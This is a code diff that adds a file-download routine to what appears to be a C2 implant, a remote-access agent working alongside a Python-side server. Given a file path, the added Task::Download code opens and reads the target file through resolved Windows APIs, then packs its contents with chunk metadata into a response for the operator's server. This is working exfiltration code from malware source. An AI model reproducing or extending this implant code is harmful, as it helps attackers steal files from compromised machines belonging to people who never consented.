@@ -142,7 +142,92 @@ auto DECLFN Task::ExecBof(
 auto DECLFN Task::Download(
     _In_ JOBS* Job
 ) -> ERROR_CODE {
+    PACKAGE* Package = Job->Pkg;
+    PARSER*  Parser  = Job->Psr;
+    
+    CHAR*  FilePath = Self->Psr->Str( Parser, 0 );
+    HANDLE FileHandle = INVALID_HANDLE_VALUE;
+    ULONG  FileSize = 0;
+    ULONG  ChunkSize = KH_CHUNK_SIZE;
+    ULONG  BytesRead = 0;
+    BYTE*  FileBuffer = nullptr;
+    
+    if ( !FilePath ) {
+        Self->Pkg->SendMsg( Job->UUID, "Invalid file path", CALLBACK_ERROR );
+        return KhGetError;
+    }
 
+    KhDbg("Download file: %s", FilePath);
+
+    // Open the file for reading
+    FileHandle = Self->Krnl32.CreateFileA(
+        FilePath, 
+        GENERIC_READ, 
+        FILE_SHARE_READ, 
+        nullptr, 
+        OPEN_EXISTING, 
+        FILE_ATTRIBUTE_NORMAL, 
+        nullptr
+    );
+
+    if ( FileHandle == INVALID_HANDLE_VALUE ) {
+        Self->Pkg->SendMsg( Job->UUID, "Failed to open file for reading", CALLBACK_ERROR );
+        return KhGetError;
+    }
+
+    // Get file size
+    FileSize = Self->Krnl32.GetFileSize( FileHandle, nullptr );
+    if ( FileSize == 0xFFFFFFFF ) { // INVALID_FILE_SIZE
+        Self->Ntdll.NtClose( FileHandle );
+        Self->Pkg->SendMsg( Job->UUID, "Failed to get file size", CALLBACK_ERROR );
+        return KhGetError;
+    }
+
+    KhDbg("File size: %d bytes", FileSize);
+
+    // For this implementation, we'll read the entire file at once
+    // In a production environment, you might want to implement chunked reading
+    FileBuffer = (BYTE*)hAlloc( FileSize );
+    if ( !FileBuffer ) {
+        Self->Ntdll.NtClose( FileHandle );
+        Self->Pkg->SendMsg( Job->UUID, "Failed to allocate buffer for file", CALLBACK_ERROR );
+        return KhGetError;
+    }
+
+    // Read the file
+    BOOL ReadResult = Self->Krnl32.ReadFile( 
+        FileHandle, 
+        FileBuffer, 
+        FileSize, 
+        &BytesRead, 
+        nullptr 
+    );
+
+    Self->Ntdll.NtClose( FileHandle );
+
+    if ( !ReadResult || BytesRead != FileSize ) {
+        hFree( FileBuffer );
+        Self->Pkg->SendMsg( Job->UUID, "Failed to read file contents", CALLBACK_ERROR );
+        return KhGetError;
+    }
+
+    KhDbg("File read successfully: %d bytes", BytesRead);
+
+    // Build response in the format expected by Python side
+    // Based on ToC2.py:398-419, expected format:
+    // current_chunk, file_id, file_path, chunk_size, file_data
+    
+    Self->Pkg->Int32( Package, 1 );              // current_chunk (1 for single chunk)
+    Self->Pkg->Str( Package, FilePath );         // file_id (using file path as ID)
+    Self->Pkg->Str( Package, FilePath );         // file_path 
+    Self->Pkg->Int32( Package, BytesRead );      // chunk_size (actual bytes read)
+    Self->Pkg->Bytes( Package, FileBuffer, BytesRead ); // file_data
+
+    hFree( FileBuffer );
+
+    KhDbg("Download response prepared for file: %s", FilePath);
+
+    return KhRetSuccess;
 }
 
 auto DECLFN Task::Upload(_In_ JOBS* Job) -> ERROR_CODE {
